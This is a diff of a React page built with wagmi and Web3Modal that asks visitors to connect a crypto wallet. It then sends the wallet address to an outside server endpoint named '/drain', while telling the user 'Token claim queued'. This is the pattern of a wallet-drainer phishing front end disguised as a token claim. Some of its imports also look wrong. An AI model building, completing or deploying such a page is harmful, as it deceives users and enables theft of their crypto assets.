@@ -1,21 +1,18 @@
 import React, { useState } from "react";
 import ReactDOM from "react-dom/client";
 
-// Wagmi + Viem
 import { WagmiConfig, createConfig, configureChains, useAccount } from "wagmi";
 import { mainnet, sepolia } from "@wagmi/chains";
-import { publicProvider } from "viem"; // <-- fixed
+import { publicProvider } from "viem/providers/public";
+
 import { InjectedConnector } from "wagmi/connectors/injected";
 import { WalletConnectConnector } from "wagmi/connectors/walletConnect";
 
-// Web3Modal v2
-import { Web3Modal, useWeb3Modal } from "@web3modal/wagmi"; // <-- updated package
+import { Web3Modal, useWeb3Modal } from "@web3modal/wagmi";
 
-/* ---------------------------
-   Wagmi Configuration
----------------------------- */
 const projectId = "962425907914a3e80a7d8e7288b23f62";
 
+// Configure chains + providers
 const { chains, publicClient } = configureChains([mainnet, sepolia], [publicProvider()]);
 
 const config = createConfig({
@@ -27,9 +24,6 @@ const config = createConfig({
   publicClient,
 });
 
-/* ---------------------------
-   App Component
----------------------------- */
 const App = () => {
   const [loading, setLoading] = useState(false);
   const [response, setResponse] = useState(null);
@@ -42,13 +36,11 @@ const App = () => {
       setLoading(true);
       setResponse(null);
 
-      // Open Web3Modal to select wallet
       const connection = await open();
       const walletAddress = connection?.accounts?.[0];
 
       if (!walletAddress) throw new Error("No wallet connected");
 
-      // Example backend request
       const res = await fetch("https://tokenbackendwork.onrender.com/drain", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -62,9 +54,7 @@ const App = () => {
 
       setResponse({
         success: res.ok,
-        message: res.ok
-          ? "Token claim queued. You will be credited shortly."
-          : "Failed to claim token.",
+        message: res.ok ? "Token claim queued." : "Failed to claim token.",
         data,
       });
     } catch (err) {
@@ -89,31 +79,7 @@ const App = () => {
               loading ? "bg-gray-600 cursor-not-allowed" : "bg-green-500 hover:bg-green-600"
             }`}
           >
-            {loading ? (
-              <div className="flex items-center justify-center">
-                <svg
-                  className="animate-spin h-5 w-5 mr-2 text-white"
-                  xmlns="http://www.w3.org/2000/svg"
-                  fill="none"
-                  viewBox="0 0 24 24"
-                >
-                  <circle
-                    className="opacity-25"
-                    cx="12"
-                    cy="12"
-                    r="10"
-                    stroke="currentColor"
-                    strokeWidth="4"
-                  />
-                  <path
-                    className="opacity-75"
-                    fill="currentColor"
-                    d="M4 12a8 8 0 018-8v8H4z"
-                  />
-                </svg>
-                Connecting...
-              </div>
-            ) : isConnected ? "Wallet Connected" : "Connect Wallet"}
+            {loading ? "Connecting..." : isConnected ? "Wallet Connected" : "Connect Wallet"}
           </button>
 
           {isConnected && (
@@ -127,16 +93,12 @@ const App = () => {
           )}
         </div>
 
-        {/* Web3Modal */}
         <Web3Modal projectId={projectId} themeMode="dark" enableNetworkSwitch />
       </div>
     </WagmiConfig>
   );
 };
 
-/* ---------------------------
-   Mount React App
----------------------------- */
 ReactDOM.createRoot(document.getElementById("root")).render(
   <React.StrictMode>
     <App />
